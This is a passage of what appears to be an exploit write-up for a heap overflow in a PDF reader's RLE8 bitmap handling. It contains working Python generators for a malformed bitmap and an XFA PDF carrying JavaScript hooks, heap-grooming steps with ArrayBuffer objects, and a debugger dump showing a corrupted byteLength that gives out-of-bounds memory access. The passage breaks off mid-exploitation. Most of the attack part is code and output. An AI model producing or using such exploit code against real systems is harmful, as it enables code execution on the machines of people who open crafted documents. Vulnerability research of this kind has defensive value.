<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>For <code>DataView</code> object, the <code>elements</code> member will point to <code>emptyElementsHeader</code> which can be used to leak the base address of the JavaScript engine module.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure>
<h3 id="5-3-Bitmap-Construct"><a href="#5-3-Bitmap-Construct" class="headerlink" title="5.3 Bitmap Construct"></a>5.3 Bitmap Construct</h3><p>Following python code can be used to generate a RLE compressed bitmap image.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>Here we’ll generate a RLE8 bitmap with the following parameters:</p>
<ul>
<li>width is <code>0xF0</code> </li>
<li>height is <code>1</code> </li>
<li>bit count is <code>8</code> </li>
</ul>
<p>Here the size of the heap buffer will be <code>0xF0</code> and we will be able to write <code>0xF4</code> bytes backward with value <code>0x10</code> .</p>
<h3 id="5-4-PDF-Construct"><a href="#5-4-PDF-Construct" class="headerlink" title="5.4 PDF Construct"></a>5.4 PDF Construct</h3><p>This section explains how to embed the generated BMP image into a PDF file. Following is the PDF template that will be used later.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>
<p>The size of the generated BMP file will be larger than 60MB. And it will be encoded in base64 and embedded within <code>6 0 obj</code> of the PDF file. To reduce the file size, this object will be compressed using the zlib/deflate compression method.</p>
<p>To exploit the vulnerability, we’ll need to have chances to run JavaScript code before and after triggering the vulnerability. This can be done by putting the JavaScript code within the <code>initialize</code> event and the <code>docReady</code> event.</p>
<p>Following python code can be used to generate the PDF file.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure>
<h3 id="5-5-Exploit-Tricks"><a href="#5-5-Exploit-Tricks" class="headerlink" title="5.5 Exploit Tricks"></a>5.5 Exploit Tricks</h3><h4 id="5-5-1-Memory-Layout-1"><a href="#5-5-1-Memory-Layout-1" class="headerlink" title="5.5.1 Memory Layout (1)"></a>5.5.1 Memory Layout (1)</h4><p>In this case, <code>ArrayBuffer</code> is more suitable for exploiting the vulnerability.</p>
<p>Firstly, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xE0</code> . And free one <code>ArrayBuffer</code> object of every <code>ArrayBuffer</code> pair to create holes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure>
<p>Then we trigger the vulnerability, and the heap buffer of the bitmap will be placed in one of the holes.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure>
<p>Since we are able to write <code>0xF4</code> bytes backward with value <code>0x10</code> . The backing store of the <code>ArrayBuffer</code> will be filled with <code>0x10</code> .</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer data</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; end of ArrayBuffer</span><br><span class="line">; metadata of next heap buffer (bitmap data)</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; bitmap data begins here</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure>
<p>Now the <code>byteLength</code> of the <code>ArrayBuffer</code> object has been changed to <code>0x10101010</code> and we can achieve Out-Of-Bounds access now. So far so good? The fact is that the process will crash immediately since we also changed the <code>DataView</code> pointer.</p>
